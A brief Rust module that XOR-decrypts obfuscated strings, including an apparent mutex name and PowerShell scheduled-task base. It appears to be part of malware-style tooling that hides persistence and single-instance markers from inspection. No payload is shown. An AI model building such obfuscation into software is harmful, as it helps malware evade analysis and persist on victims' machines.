use crate::xor_data::{XOR_KEY, ENCRYPTED_STRINGS};

pub(crate) fn decrypt_str(index: usize) -> String {
    let enc = ENCRYPTED_STRINGS[index];
    let dec: Vec<u8> = enc.iter().map(|&b| b ^ XOR_KEY).collect();
    String::from_utf8(dec).expect("invalid utf8")
}

pub(crate) enum Secret {
    MutexName = 0,
    PsSchtaskBase = 1,
    // ... weitere
}

impl Secret {
    pub fn to_string(self) -> String {
        decrypt_str(self as usize)
    }
}
